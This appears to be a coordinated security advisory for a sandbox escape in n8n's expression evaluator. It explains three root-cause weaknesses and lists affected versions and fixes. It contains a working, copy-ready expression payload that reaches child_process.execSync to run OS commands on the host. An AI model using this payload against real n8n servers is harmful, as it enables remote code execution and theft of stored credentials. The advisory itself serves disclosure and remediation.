## Summary

A critical sandbox escape vulnerability exists in n8n's expression evaluator. Three independent weaknesses in the `@n8n/tournament` library combine to allow any authenticated user — regardless of role — to execute arbitrary OS commands on the host server by placing a crafted expression in any workflow node.

**CVSS 3.1 Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

---

## Affected Versions

**n8n 1.x — Vulnerable:** `1.9.0` – `1.123.21` | **Patched:** `1.123.22+`

**n8n 2.x — Vulnerable:** `2.0.0` – `2.9.2`, `2.10.0` | **Patched:** `2.9.3+`, `2.10.1+`

---

## Root Cause

n8n evaluates `{{ }}` expressions by parsing them into an AST, applying transformation passes, then executing via `new Function()`. The sandbox relies on three mechanisms, all of which fail:

**[A] `caller` and `arguments` absent from the property blocklist**

`packages/workflow/src/utils.ts` (lines 368–377) defines `unsafeObjectProperties` — a set used by `PrototypeSanitizer` to reject dangerous member accesses at the AST level. The properties `caller` and `arguments` are not listed, so `inner.caller` and `fn.arguments` pass the AST check and are emitted into generated code.

```typescript
// packages/workflow/src/utils.ts — vulnerable state
const unsafeObjectProperties = new Set([
    '__proto__', 'prototype', 'constructor', 'getPrototypeOf',
    'mainModule', 'binding', '_load', 'prepareStackTrace',
    // "caller" and "arguments" are absent
]);
```

**[B] Generated code runs in sloppy mode**

`@n8n/tournament/src/FunctionEvaluator.ts` (line 13) compiles expressions using:

```typescript
const func = new Function('E', code + ';');
```

Without a `"use strict"` prefix, the generated function runs in sloppy mode. In sloppy mode, `Function.prototype.caller` and `Function.prototype.arguments` are live and return the calling function and its arguments. In strict mode, accessing these properties throws `TypeError` — which would make weakness A unexploitable. This issue exists in every published version of `@n8n/tournament` (1.0.0 – 1.1.0).

**[C] The `__sanitize` gate can be poisoned**

`PrototypeSanitizer` rewrites every computed member access `obj[expr]` to `obj[___n8n_data.__sanitize(expr)]`, where `___n8n_data` is bound to `this` inside the generated function. An attacker who can re-invoke the outer function with a different `this` (via `caller.apply(evilCtx)`) replaces `__sanitize` with an attacker-controlled function that returns any string — including `"constructor"`.

---

## Exploit Chain

```
Step 1  inner.caller
          → reference to the outer Tournament-generated function anonymous(E)
            "caller" is not in the blocklist → AST check passes

Step 2  caller.arguments[0]
          → the error handler E passed by the evaluator
            "arguments" is not in the blocklist → AST check passes

Step 3  caller.apply({ __sanitize: () => "constructor", __poisoned: true }, [E])
          → re-invokes the outer function with a poisoned context
            all subsequent __sanitize() calls now return "constructor"

Step 4  caller[{}]
          → rewritten to: caller[___n8n_data.__sanitize({})]
          → caller["constructor"]
          → the real, unshimmed Function constructor

Step 5  Function('return process.mainModule.require("child_process")
                  .execSync("<cmd>").toString()')()
          → arbitrary OS command executed on the host
```

---

## Steps to Reproduce

**Prerequisites:** A running n8n instance on a vulnerable version. Any authenticated account with workflow create/edit access.

**Option A — Manual (expression field):**

1. Create a new workflow and add a **Set** node
2. In any value field, enable Expression mode and enter:

```
={{ (function inner() {
  var c = inner.caller;
  if (__poisoned) {
    var F = c[{}];
    return F('return process.mainModule.require("child_process").execSync("id && whoami && hostname").toString()')().trim();
  } else {
    return c.apply({
      __sanitize : function(x) { return "constructor"; },
      __poisoned : true
    }, [c.arguments[0]]);
  }
})() }}
```

3. Click **Execute workflow**
4. The output field `rce_result` contains the command output

**Option B — Workflow import (attached `poc.json`):**

1. n8n → Workflows → **Import from file** → select `poc.json`
2. Click **Execute workflow**
3. Open the **Edit Fields (RCE)** node output — `rce_result` contains `id`, `whoami`, and `hostname` output from the server

---

## Proof of Concept

The attached `poc.json` is a ready-to-import n8n workflow. When executed on a vulnerable instance, the `rce_result` output field displays:

```
"rce_result": 
"uid=1000(node) gid=1000(node) groups=1000(node),1000(node)\nnode\n4237d7d861a5"
```

Output will reflect the OS user account running the n8n process on the target system.

---

## Impact

Any authenticated n8n user with workflow edit access can:

- Execute arbitrary OS commands as the n8n process user
- Read, write, or delete any file accessible to the process
- Exfiltrate all stored credentials (400+ integrations: AWS, GCP, GitHub, Slack, database connection strings, OAuth tokens, SSH keys, webhook secrets)
- Establish persistent access via cron jobs, SSH `authorized_keys`, or reverse shells
- Pivot to internal systems reachable from the n8n host

This affects all deployment modes: self-hosted (bare metal, Docker, Kubernetes) and n8n Cloud where expression evaluation occurs server-side.

---

## Recommended Fixes

**Fix 1 — Add `caller`, `callee`, `arguments` to `unsafeObjectProperties` (immediate)**

```typescript
// packages/workflow/src/utils.ts
const unsafeObjectProperties = new Set([
    '__proto__', 'prototype', 'constructor', 'getPrototypeOf',
    'mainModule', 'binding', '_load', 'prepareStackTrace',
    'caller',    // ADD
    'callee',    // ADD
    'arguments', // ADD
]);
```

**Fix 2 — Enable strict mode in `FunctionEvaluator` (strongly recommended)**

```typescript
// @n8n/tournament/src/FunctionEvaluator.ts
// Before:
const func = new Function('E', code + ';');
// After:
const func = new Function('E', '"use strict";' + code + ';');
```

Strict mode causes `fn.caller` and `fn.arguments` to throw `TypeError`, closing this attack class even if the blocklist is later found incomplete. This has not been applied in any released version of `@n8n/tournament` to date.

**Fix 3 — Reject non-literal computed property access (defense-in-depth)**

Instead of routing `obj[expr]` through `__sanitize` (which can be poisoned), reject it outright in `PrototypeSanitizer`:

```typescript
} else {
  throw new Error('dynamic computed property access is not allowed');
}
```

---

## Version Impact Detail

**n8n < 1.9.0** — Not affected (`@n8n/tournament` not present)

**n8n 1.9.0 – 1.123.21** (n8n-workflow 1.9.0 – 1.120.8) — **Vulnerable**

**n8n 1.123.22+** (n8n-workflow 1.120.9+) — Patched (Fix 1 only; Fix 2 not applied)

**n8n 2.0.0 – 2.9.2** (n8n-workflow 2.0.0 – 2.9.0) — **Vulnerable**

**n8n 2.9.3 – 2.9.4** (n8n-workflow 2.9.1) — Patched

**n8n 2.10.0** (n8n-workflow 2.10.0) — **Vulnerable** (patch accidentally dropped — regression)

**n8n 2.10.1+** (n8n-workflow 2.10.1+) — Patched (Fix 1 only; Fix 2 not applied)

@n8n/tournament Fix 2 (strict mode) has **never been applied** across all published versions 1.0.0 – 1.1.0.

---

## Disclosure

- **Discovered:** 2026-05-11
- **Reported:** 2026-05-11
- **Researcher:** lwd3c

